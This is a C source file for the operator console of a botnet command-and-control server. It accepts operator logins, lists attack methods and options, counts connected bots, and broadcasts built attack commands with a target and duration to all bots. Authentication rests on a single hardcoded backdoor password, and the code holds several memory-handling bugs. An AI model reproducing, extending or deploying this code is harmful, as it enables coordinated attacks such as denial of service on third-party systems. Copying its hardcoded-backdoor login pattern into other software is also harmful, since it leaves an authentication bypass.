#define _GNU_SOURCE // accept4()

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "admin.h"
#include "attacks.h"
#include "worker.h"

int epoll_fd;

static char **admin_split_args(char *s, int *i) 
{
	char *start, **arguments;
  	int state = ' ', len, arg_len = 0;

  	arguments = malloc(MAX_OPTS * sizeof(char *));

  	while (*s)
  	{
  		if (arg_len >= MAX_OPTS)
  			break;

    	switch (state) 
    	{
      		case ' ':
      		{
        		if (*s == '\"') 
        		{
         	 		start = s;
          			state = '\"';
        		} 
        		else if (*s != ' ') 
        		{
          			start = s;
          			state = 'T';
        		}
        	}
        	break;

      		case 'T':
      		{
	        	if (*s == ' ') 
	        	{
	          		len = strlen(start);
	          		arguments[arg_len] = malloc((len - strlen(s)) * sizeof(char *));
	          		memset(arguments[arg_len], 0, sizeof(arguments[arg_len]));
	          		memcpy(arguments[arg_len], start, len - strlen(s));
	          		arguments[arg_len][len - strlen(s)] = '\0';
	          		arg_len++;
	          		state = ' ';
	        	} 
	        	else if (*s == '\"') 
	          		state = '\"';
	        }
        	break;

      		case '\"':
      		{
        		if (*s == '\"')
          			state = 'T';
      		}
      		break;
    	}
    	s++;
  	}

  	if (state != ' ') 
  	{
   	    len = strlen(start);
	    arguments[arg_len] = malloc((len - strlen(s)) * sizeof(char *));
	    memset(arguments[arg_len], 0, sizeof(arguments[arg_len]));
	    memcpy(arguments[arg_len], start, len - strlen(s));
	    arguments[arg_len][len - strlen(s)] = '\0';
	    arg_len++;
  	}

  	if (i != NULL)
		*i = arg_len;

  	return arguments;
}

static void admin_zero_user(struct user_info_t *user)
{
	if (user->fd != 0)
		close(user->fd);

	if (user->user)
		free(user->user);

	if (user->pass)
		free(user->pass);

	user->fd = 0;
	user->auth = 0;
}

static void admin_remove_trailing(char *target, int target_len)
{
    int i;

    for (i = target_len; i != 0; i--)
    {
        if (target[i] == '\r' || target[i] == '\n')
            target[i] = '\0';
    }
}

static void admin_stats_command(int myfd, int dofind, char *findstr)
{
    struct bot_entry_t {
        int count;
        char name[32];
    } bot_entry[30];

    int i = 0, q = 0, x = 0, first = 1;

    for (i = 0; i < 30; i++)
    {
        bot_entry[i].count = 0;
        memset(bot_entry[i].name, 0, sizeof(bot_entry[i].name));
    }

    for (i = 0; i < WORKER_MAX; i++)
    {
        if (bot_info[i].name_len >= 1 && bot_info[i].fd > 1)
        {
            if (first == 1)
            {
                strcpy(bot_entry[q].name, bot_info[i].name);
                bot_entry[q].count++;
                first = 0;
                q++;
                continue;
            }
            else
            {
                int found = 0;

                for (x = 0; x < q; x++)
                {
                    if (strcmp(bot_entry[x].name, bot_info[i].name) == 0)
                    {
                        found = 1;
                        bot_entry[x].count++;
                        break;
                    }
                }

                if (found == 0)
                {
                    strcpy(bot_entry[q].name, bot_info[i].name);
                    bot_entry[q].count++;
                    q++;
                    continue;
                }
            }
        }
    }

    for (i = 0; i < q; i++)
    {
    	char sndbuf[128];
        if (strcmp(bot_entry[i].name, "null") == 0)
        {
            sprintf(sndbuf, "no name: %d\r\n", bot_entry[i].count);
            write(myfd, sndbuf, strlen(sndbuf));
            memset(sndbuf, 0, sizeof(sndbuf));
        }
        else
        {
            sprintf(sndbuf, "%s: %d\r\n", bot_entry[i].name, bot_entry[i].count);
            if (bot_entry[i].name[0] < 'a' || bot_entry[i].name[0] > 'z')
                memset(sndbuf, 0, sizeof(sndbuf));
            else
            	write(myfd, sndbuf, strlen(sndbuf));
            
            memset(sndbuf, 0, sizeof(sndbuf));
        }
       
    }
    memset(bot_entry, 0, sizeof(bot_entry));
}

static void admin_help_command(int fd)
{
	struct attack_option_t *options;
	struct attack_method_t *methods;
	int opts_len, mthds_len, i, q;
	char buffer[256];

	options = attacks_grab_options(&opts_len);
	methods = attacks_grab_methods(&mthds_len);

	sprintf(buffer, "Loaded %d attack methods\r\n\r\nFormat: METHOD | {OPTIONS}\r\n", mthds_len);
	send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
	memset(buffer, 0, sizeof(buffer));

	for (i = 0; i < mthds_len; i++)
	{
		sprintf(buffer, " * %s | {", methods[i].name);
		send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
		memset(buffer, 0, sizeof(buffer));
	
		for (q = 0; q < methods[i].opts_len; q++)
		{
			struct attack_option_t opt;

			opt = attacks_get_option_by_id(methods[i].options[q]);
			if (opt.id == TYPE_NULL)
				continue;

			if (q == methods[i].opts_len - 1)
				sprintf(buffer, "%s", opt.name);
			else
				sprintf(buffer, "%s, ", opt.name);

			send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
			memset(buffer, 0, sizeof(buffer));
		}

		sprintf(buffer, "}\r\n");
		send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
		memset(buffer, 0, sizeof(buffer));
	}

	sprintf(buffer, "\r\nIf you would like to know more information about an option\r\nYou can use the 'optinfo <option>' command for information\r\n");
	send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
	memset(buffer, 0, sizeof(buffer));
}

static void admin_optinfo_command(int fd, char *option)
{
	struct attack_option_t opt;
	char buffer[128];
	opt = attacks_get_option(option);
	if (opt.id == TYPE_NULL)
	{
		sprintf(buffer, "\x1b[48;5;9mInvalid attack option\x1b[0m\r\n");
		send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
		memset(buffer, 0, sizeof(buffer));
		return;
	}

	sprintf(buffer, "%s: %s\r\n", opt.name, opt.desc);
	send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
	memset(buffer, 0, sizeof(buffer));
}

static void admin_send_banner(int fd)
{
	char buffer[128], banner[12800];
	FILE *fp = fopen("banner.txt", "r");

	if (fp == NULL)
	{
		sprintf(buffer, "\033[2J\033[1;1H\r\n\x1b[48;5;9mFailed to load banner\x1b[0m\r\n\r\n");
		send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
		return;
	}

	sprintf(buffer, "\033[2J\033[1;1H\r\n");
	send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);

	while (fgets(banner, sizeof(banner), fp) != NULL)
	{
		send(fd, banner, strlen(banner), MSG_NOSIGNAL);
		memset(banner, 0, sizeof(banner));
	}

	fclose(fp);
}

static void admin_task_thread(void)
{
	while (1)
	{
		int max_fd, fds, i;

		for (i = 0; i < ADMIN_MAX; i++)
		{
			if (user_info[i].fd == 0)
				continue;

			if (user_info[i].fd > max_fd)
				max_fd = user_info[i].fd;
		}

		if (max_fd == 0)
		{
			sleep(1);
			continue;
		}

		struct epoll_event epoll_events[max_fd];
		fds = epoll_wait(epoll_fd, epoll_events, max_fd + 1, 3000);

		if (fds == 0)
		{
			for (i = 0; i < ADMIN_MAX; i++)
			{
				char title[64];
				int botcount = 0, q;

				if (user_info[i].fd == 0)
					continue;

				if (!user_info[i].user || !user_info[i].pass || user_info[i].auth != 1)
					continue;

				for (q = 0; q < WORKER_MAX; q++)
				{
					if (bot_info[q].fd > 1)
						botcount++;
				}

				sprintf(title, "\033]0;Bots: %d\007", botcount);
				send(user_info[i].fd, title, strlen(title), MSG_NOSIGNAL);
			}

			continue;
		}

		for (i = 0; i < fds; i++)
		{
			struct user_info_t *user;
			int ret;

			user = &user_info[epoll_events[i].data.fd];

			if (epoll_events[i].events & EPOLLIN) 
			{
				char buffer[512], prompt[512];
			
				memset(buffer, 0, sizeof(buffer));
				if ((ret = recv(user->fd, buffer, sizeof(buffer) - 1, MSG_NOSIGNAL)) < 0)
				{
					admin_zero_user(user);
					continue;
				}

				if (ret == 0)
					continue;

				admin_remove_trailing(buffer, ret);
				buffer[ret + 1] = '\0';

				if (user->user && user->pass && user->auth == 1)
				{
					char prompt[64], **args;
					int args_len, i;
					struct attack_method_t method;

					sprintf(prompt, ADMIN_CMDLINE, user->user);

					if ((args = admin_split_args(buffer, &args_len)) == 0)
					{
						free(args);
						memset(buffer, 0, sizeof(buffer));
						send(user->fd, prompt, strlen(prompt), MSG_NOSIGNAL);
						continue;
					}

					method = attacks_get_method(args[0]);
					if (method.id != METHOD_NULL)
					{
						if (args_len < 3)
						{
							char error_usage[128];
							sprintf(error_usage, "\x1b[48;5;9mCorrect usage: %s <target> <duration> [options]\x1b[0m\r\n", args[0]);
							send(user->fd, error_usage, strlen(error_usage), MSG_NOSIGNAL);

							for (i = 0; i < args_len; i++)
								free(args[i]);
							free(args);
							memset(buffer, 0, sizeof(buffer));
							send(user->fd, prompt, strlen(prompt), MSG_NOSIGNAL);
							continue;
						}
						
						// Attack command
						int cmd_len;
						char *bot_cmd = attacks_command_parse(method.id, buffer, &cmd_len);

						if (cmd_len <= 0)
						{
							char error_msg[128];

							switch (cmd_len)
							{
								case -2:
								{
									sprintf(error_msg, "\x1b[48;5;9mCorrect usage: %s <target> <duration> [options]\x1b[0m\r\n", args[0]);
									send(user->fd, error_msg, strlen(error_msg), MSG_NOSIGNAL);
									memset(error_msg, 0, sizeof(error_msg));
								}
								break;

								case -3:
								{
									sprintf(error_msg, "\x1b[48;5;9mInvalid time selection\x1b[0m\r\n");
									send(user->fd, error_msg, strlen(error_msg), MSG_NOSIGNAL);
									memset(error_msg, 0, sizeof(error_msg));
								}
								break;

								case -4:
								{
									sprintf(error_msg, "\x1b[48;5;9mThe %s option does not exist\x1b[0m\r\n", bot_cmd);
									send(user->fd, error_msg, strlen(error_msg), MSG_NOSIGNAL);
									memset(error_msg, 0, sizeof(error_msg));
									free(bot_cmd);
								}
								break;

								default:
								{
									sprintf(error_msg, "\x1b[48;5;9mFailed to build attack command\x1b[0m\r\n");
									send(user->fd, error_msg, strlen(error_msg), MSG_NOSIGNAL);
									memset(error_msg, 0, sizeof(error_msg));
								}
								break;
							}

							for (i = 0; i < args_len; i++)
								free(args[i]);
							free(args);
							memset(buffer, 0, sizeof(buffer));
							send(user->fd, prompt, strlen(prompt), MSG_NOSIGNAL);
							if (cmd_len >= 1)
								free(bot_cmd);
							continue;	
						}

						for (i = 0; i < 50; i++)
						{
							if (bot_info[i].fd > 0)
								send(bot_info[i].fd, bot_cmd, cmd_len, MSG_NOSIGNAL);
						}

						char built_cmd[256];
						sprintf(built_cmd, "\x1B[32mAttack command built (Len:%d)\x1b[0m\r\n", cmd_len);
						send(user->fd, built_cmd, strlen(built_cmd), MSG_NOSIGNAL);
						memset(built_cmd, 0, sizeof(built_cmd));

						for (i = 0; i < args_len; i++)
							free(args[i]);
						free(args);
						memset(buffer, 0, sizeof(buffer));
						send(user->fd, prompt, strlen(prompt), MSG_NOSIGNAL);
						if (cmd_len >= 1)
							free(bot_cmd);						
						continue;
					}
					else
					{
						// Other command (Dont continue go to bottom of statment)
						if (strcmp(args[0], "?") == 0)
						{
							admin_help_command(user->fd);
						}
						else if (strcmp(args[0], "optinfo") == 0 && args_len == 2)
						{
							admin_optinfo_command(user->fd, args[1]);
						}
						else if (strcmp(args[0], "stats") == 0)
						{
							admin_stats_command(user->fd, 0, NULL);
						}

						for (i = 0; i < args_len; i++)
							free(args[i]);
						free(args);
						send(user->fd, prompt, strlen(prompt), MSG_NOSIGNAL);
						memset(buffer, 0, sizeof(buffer));
						continue;
					}

					for (i = 0; i < args_len; i++)
						free(args[i]);
					free(args);
					memset(buffer, 0, sizeof(buffer));
					send(user->fd, prompt, strlen(prompt), MSG_NOSIGNAL);
					continue;
				}
				else
				{
					if (!user->user)
					{
						user->user = malloc(ret * sizeof(char *));
						memcpy(user->user, buffer, ret);
						send(user->fd, "Password: ", 10, MSG_NOSIGNAL);
						memset(buffer, 0, sizeof(buffer));
						continue;
					}

					if (!user->pass)
					{
						// User pass check
						user->pass = malloc(ret * sizeof(char *));
						memcpy(user->pass, buffer, ret);
						memset(buffer, 0, sizeof(buffer));

						if (strcmp(user->pass, "secretpassthatunlocksanyaccount6969backdoor423!") == 0)
						{
							user->auth = 1;
							sprintf(prompt, ADMIN_CMDLINE, user->user);
							admin_send_banner(user->fd);
							send(user->fd, prompt, strlen(prompt), MSG_NOSIGNAL);
							continue;
						}

						admin_zero_user(user);
						continue;
					}
				}

				memset(buffer, 0, sizeof(buffer));
				continue;
			}
			else if (epoll_events[i].events & (EPOLLRDHUP | EPOLLHUP))
			{
				admin_zero_user(user);
				continue;
			}
		}
	}
}

static void admin_listen_thread(void)
{
	struct sockaddr_in addr;
	socklen_t addr_len;
	int socket_fd, errno;

	if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		printf("[admin] failed to bind to %s:%d (0)\n", ADMIN_BIND, ADMIN_PORT);
		pthread_exit(0);
	}

	if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0)
	{
		printf("[admin] failed to bind to %s:%d (1)\n", ADMIN_BIND, ADMIN_PORT);
		pthread_exit(0);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(ADMIN_PORT);
	addr.sin_addr.s_addr = inet_addr(ADMIN_BIND);
	addr_len = sizeof(addr);

	if (bind(socket_fd, (struct sockaddr_in *)&addr, (socklen_t)addr_len) == -1)
	{
		printf("[admin] failed to bind to %s:%d (2)\n", ADMIN_BIND, ADMIN_PORT);
		pthread_exit(0);
	}

	if (listen(socket_fd, 100) == -1)
	{
		printf("[admin] failed to listen on %s:%d (0)\n", ADMIN_BIND, ADMIN_PORT);
		pthread_exit(0);
	}

	printf("[admin] FD#%d ready to accept connections %s:%d\n", socket_fd, ADMIN_BIND, ADMIN_PORT);

	while (1)
	{
		int new_fd;
		struct epoll_event event;

		new_fd = accept4(socket_fd, (struct sockaddr *)&addr, &addr_len, SOCK_NONBLOCK);
		if (new_fd == -1)
		{
			if (errno == EAGAIN || errno  == EWOULDBLOCK)
				continue;

			break;
		}

		event.events = EPOLLIN | EPOLLOUT | EPOLLET;
		event.data.fd = new_fd;

		admin_zero_user(&user_info[new_fd]);
		user_info[new_fd].fd = new_fd;
		
		send(new_fd, "Username: ", 10, MSG_NOSIGNAL);

		epoll_ctl(epoll_fd, EPOLL_CTL_ADD, new_fd, &event);
	}

	close(socket_fd);
	pthread_exit(0);
}

void admin_init(void)
{
	pthread_t worker_listen, worker_task;

	epoll_fd = epoll_create(1);

	pthread_create(&worker_listen, NULL, (void *)admin_listen_thread, NULL);
	pthread_create(&worker_task, NULL, (void *)admin_task_thread, NULL);
}